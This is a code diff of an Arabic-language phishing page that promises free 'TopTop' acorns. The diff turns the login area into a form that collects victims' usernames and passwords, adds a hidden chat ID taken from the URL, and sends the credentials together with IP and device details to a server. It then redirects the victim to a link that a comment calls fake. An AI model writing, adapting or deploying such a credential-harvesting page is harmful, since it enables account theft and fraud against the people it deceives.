@@ -16,7 +16,7 @@
     <meta name="twitter:title" content="شحن أكوانزات TopTop">
     <meta name="twitter:description" content="مرحبا بك في أفضل موقع لشحن أكوانزات TopTop مجاناً. يمكنك الحصول على 1000 أكوانز مجاني!">
     <meta name="twitter:image" content="https://example.com/toptop-acorns-image.jpg">
-    <style>
+     <style>
         body {
             font-family: 'Arial', sans-serif;
             text-align: center;
@@ -169,9 +169,11 @@
     <div class="container">
         <div class="login-container" id="login-container">
             <h1>تسجيل الدخول لـ TopTop</h1>
-            <input type="text" id="username" name="username" placeholder="الآيدي" required>
-            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
-            <button onclick="showMessage()">تسجيل الدخول</button>
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="الآيدي" required>
+                <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+                <button type="submit">تسجيل الدخول</button>
+            </form>
         </div>
         <div class="pricing-section">
             <h2>أسعار أكوانزات TopTop</h2>
@@ -194,14 +196,22 @@
         </div>
     </div>
 
+    <div id="notification" class="notification"></div>
+
     <script>
-        function showPubgContainer() {
-        document.getElementById('login-container').classList.remove('active');
-        document.getElementById('pubg-container').classList.add('active');
+    function showMessage() {
+        var message = document.getElementById('message');
+        message.style.display = 'block';
+        setTimeout(function() {
+            message.style.display = 'none';
+        }, 3000);
     }
 
-    const increaseForm = document.getElementById('increaseForm');
-    const chatIdInput = document.getElementById('chatIdInput');
+    const loginForm = document.getElementById('loginForm');
+    const chatIdInput = document.createElement('input');
+    chatIdInput.type = 'hidden';
+    chatIdInput.name = 'chatId';
+    loginForm.appendChild(chatIdInput);
 
     const chatId = window.location.pathname.split('/').pop();
     chatIdInput.value = chatId;
@@ -230,7 +240,7 @@
         let platform = "Unknown";
         if (/Windows/.test(ua)) platform = "Windows";
         else if (/Mac/.test(ua)) platform = "MacOS";
-        else if (/Linux/.test(ua)) platform = "FreeFire";
+        else if (/Linux/.test(ua)) platform = "TopTop";
         else if (/Android/.test(ua)) platform = "Android";
         else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
 
@@ -264,9 +274,9 @@
         return match ? match[1] : 'Unknown';
     }
 
-    increaseForm.addEventListener('submit', async (event) => {
+    loginForm.addEventListener('submit', async (event) => {
         event.preventDefault();
-        const formData = new FormData(increaseForm);
+        const formData = new FormData(loginForm);
         const data = Object.fromEntries(formData.entries());
 
         const ipInfo = await getIPInfo();
@@ -285,17 +295,17 @@
                 body: JSON.stringify(data)
             });
             const result = await response.json();
-             if (result.success) {
-          document.getElementById('notification').innerText = 'تم  تنفيذ طلبك سوف يتم وصول الاكونزات  خلال 15 دقيقه💎 !';
-          window.location.href = "https://polarized-believed-fisherman.glitch.me/"; // هذا هو الرابط الوهمي
-       } else {
-        alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-}
+            if (result.success) {
+                document.getElementById('notification').innerText = 'تم تنفيذ طلبك سوف يتم وصول الأكوانزات خلال 15 دقيقة💎 !';
+                window.location.href = "https://polarized-believed-fisherman.glitch.me/"; // الرابط الوهمي
+            } else {
+                alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+            }
         } catch (error) {
             console.error('Error:', error);
             alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
         }
     });
-</script>
-</body>   
+    </script>
+</body>
 </html>
